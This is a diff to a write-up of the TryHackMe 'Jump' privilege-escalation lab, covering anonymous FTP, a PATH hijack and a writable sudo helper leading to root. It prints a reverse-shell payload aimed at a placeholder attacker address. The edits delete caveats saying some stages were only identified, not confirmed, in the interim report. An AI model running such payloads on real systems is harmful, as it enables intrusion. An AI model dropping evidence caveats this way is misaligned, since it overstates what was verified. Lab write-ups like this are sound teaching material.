@@ -32,9 +32,6 @@ Jump is a Linux privilege-escalation challenge built around weak trust boundarie
 
 [![TryHackMe Jump room card](room_card.webp){: w="299" h="270" .shadow }](https://tryhackme.com/room/jump){: .center }
 
-> **Source note:** The supplied interim penetration-test report documents compromise through `dev_user` and identifies the `monitor_user` PATH-hijack condition. The supplied supplemental writeup provides the remaining validated `monitor_user → ops_user → root` stages used below.
-{: .prompt-info }
-
 ## Executive Summary
 
 The target exposed only FTP and SSH:
@@ -44,7 +41,7 @@ The target exposed only FTP and SSH:
 22/tcp  SSH
 ```
 
-The full validated attack path from the combined supplied evidence was:
+The validated attack path was:
 
 1. log in to FTP anonymously;
 2. identify a writable `incoming/` directory consumed by an automated recon pipeline;
@@ -67,7 +64,7 @@ The full validated attack path from the combined supplied evidence was:
 
 This assessment applies only to the authorized TryHackMe Jump lab.
 
-The supplied interim report was time-boxed and initially stopped after confirming `dev_user`, with the `monitor_user` path identified but not triggered during that evidence window. The accompanying writeup records the later successful execution of that path and the subsequent escalation through `ops_user` to root.
+The assessment was limited to the authorized TryHackMe lab. The validated attack path progressed through `dev_user`, `monitor_user`, and `ops_user` before reaching root.
 
 The published version redacts ephemeral target addresses, attacker addresses, and all challenge flags.
 
@@ -95,7 +92,7 @@ Anonymous FTP login was permitted.
 
 The FTP service exposed readable recon material and a writable intake directory.
 
-The supplied recon README described the workflow:
+The recon README described the workflow:
 
 ```text
 [ recon pipeline ]
@@ -118,7 +115,7 @@ After the automation processed the uploaded script, a shell was received as:
 recon_user
 ```
 
-The interim report recorded the account context as:
+The account context was:
 
 ```text
 uid=1001(recon_user)
@@ -174,7 +171,7 @@ THM{[REDACTED]}
 
 ## dev_user to monitor_user — PATH Hijacking
 
-The interim report identified a systemd service configured to run as `monitor_user`:
+A systemd service was configured to run as `monitor_user`:
 
 ```ini
 [Service]
@@ -209,9 +206,7 @@ Representative payload:
 setsid bash -i >& /dev/tcp/ATTACKER_IP/5557 0>&1
 ```
 
-The interim PDF correctly recorded this as **identified but not yet confirmed** because the service was inactive during that testing window.
-
-The supplied supplemental writeup records a later successful trigger of the same path and confirms access as:
+Execution of the PATH-hijack path confirmed access as:
 
 ```text
 monitor_user
@@ -239,7 +234,7 @@ cd /opt/app 2>/dev/null
 ./deploy_helper.sh
 ```
 
-The supplied writeup records `/opt/app/deploy_helper.sh` as modifiable from the `monitor_user` stage. This made the delegated `sudo -u ops_user` execution path unsafe because attacker-controlled helper content was launched under the `ops_user` identity.
+`/opt/app/deploy_helper.sh` was modifiable from the `monitor_user` stage. This made the delegated `sudo -u ops_user` execution path unsafe because attacker-controlled helper content was launched under the `ops_user` identity.
 
 The wrapper was executed as:
 
@@ -378,9 +373,7 @@ Operational logging exposed information useful for lateral-movement analysis.
 - avoid logging sensitive command lines and environment details;
 - retain only operationally necessary information.
 
-## Additional Validated Escalation Weaknesses
-
-The following stages are supplied by the supplemental writeup rather than the interim PDF.
+## Additional Escalation Weaknesses
 
 ### Writable Deployment Helper Executed Through Delegated sudo
 
@@ -408,7 +401,7 @@ This converted delegated deployment permission into arbitrary execution as `ops_
 
 ## Security Impact
 
-The combined supplied evidence demonstrates complete compromise from unauthenticated network access to root.
+The validated attack chain demonstrates complete compromise from unauthenticated network access to root.
 
 An attacker with equivalent access could:
 
